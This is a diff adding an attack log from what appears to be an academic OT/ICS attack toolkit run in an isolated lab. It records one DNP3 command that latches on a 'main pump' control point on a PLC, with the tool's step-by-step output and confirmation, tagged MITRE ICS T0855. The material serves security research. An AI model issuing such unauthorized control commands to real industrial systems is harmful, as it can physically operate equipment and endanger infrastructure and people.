@@ -1,0 +1,17 @@
+======================================================================
+  TFM - TOOLKIT DE ATAQUES OT/ICS (laboratorio local aislado)
+  DNP3 - Bomba Principal (CROB indice 3)
+======================================================================
+  Fecha      : 2026-10-14 10:08:14
+  Objetivo   : 192.168.40.11:20000 value=true
+  MITRE ICS  : T0855
+======================================================================
+$ python3 -m modules._cli.dnp3_cli write --target 192.168.40.11 --port 20000 --index 3 --value true
+[*] Conectando a PLC DNP3 en 192.168.40.11:20000...
+[*] Enviando CROB LATCH_ON al indice 3...
+    [dnp3] Parando gateway_dnp3_2 para liberar conexion DNP3...
+    [dnp3] gateway_dnp3_2 parado.
+    [dnp3] gateway_dnp3_2 rearrancado.
+[+] CROB LATCH_ON -> indice 3: CONFIRMADO por el outstation.
+[+] Sesion DNP3 finalizada.
+[=] Código de salida: 0
